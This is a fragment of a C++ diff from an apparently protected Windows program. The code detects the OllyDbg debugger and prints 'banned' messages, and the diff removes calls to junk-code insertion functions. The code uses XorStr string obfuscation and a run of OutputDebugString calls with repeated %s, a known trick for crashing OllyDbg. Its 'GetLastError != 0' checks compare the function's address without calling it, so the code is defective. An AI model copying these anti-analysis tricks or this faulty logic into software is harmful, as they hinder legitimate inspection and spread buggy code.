         system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE OllyDBG detected && ECHO OllyDBG detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
     }
     if (GetLastError != 0)
     {
-        JunkCodeFucker();
-            trampoline;
-            CppJunkCodeFucker();
-            JunkCodeFucker();
-                OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                    TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                    TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                    TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-            system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Banned && ECHO You have been banned for using reverse engineering tools against our software. && TIMEOUT 10 >nul").c_str());
-            exit(0);
         
+        trampoline;
+        
+        
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Banned && ECHO You have been banned for using reverse engineering tools against our software. && TIMEOUT 10 >nul").c_str());
+        exit(0);
+
     }
     if (GetLastError == 0)
     {
-        JunkCodeFucker();
+        
         OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
         trampoline;
-        CppJunkCodeFucker();
-        JunkCodeFucker();
+        
+        
         _start();
         trampoline;
-        CppJunkCodeFucker();
-        JunkCodeFucker();
+        
+        
         OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -1116,23 +1116,23 @@ int main()
     }
     else
     {
-        JunkCodeFucker();
+        
         OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
         trampoline;
-        CppJunkCodeFucker();
-        JunkCodeFucker();
-            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        
+        
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
         system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Error && ECHO An error has ocured. && TIMEOUT 10 >nul").c_str());
         exit(0);
     }
-    
-        
-    
+
+
+
 }
 
